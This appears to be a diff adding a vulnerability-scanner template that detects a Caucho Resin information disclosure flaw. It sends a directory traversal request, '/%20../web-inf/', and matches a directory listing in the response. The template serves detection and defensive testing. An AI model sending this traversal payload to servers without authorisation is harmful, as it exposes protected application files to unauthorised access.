@@ -1,0 +1,28 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - condition: and
+          part: body
+          type: word
+          words:
+            - / ../web-inf/
+            - Directory of /
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/%20../web-inf/'
+id: resin-cnnvd-200705-315
+info:
+    author: princechaddha
+    metadata:
+        max-request: 1
+    name: Caucho Resin Information Disclosure
+    reference:
+        - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-200705-315
+    severity: high
+    tags:
+        - resin
+        - caucho
+        - Resin
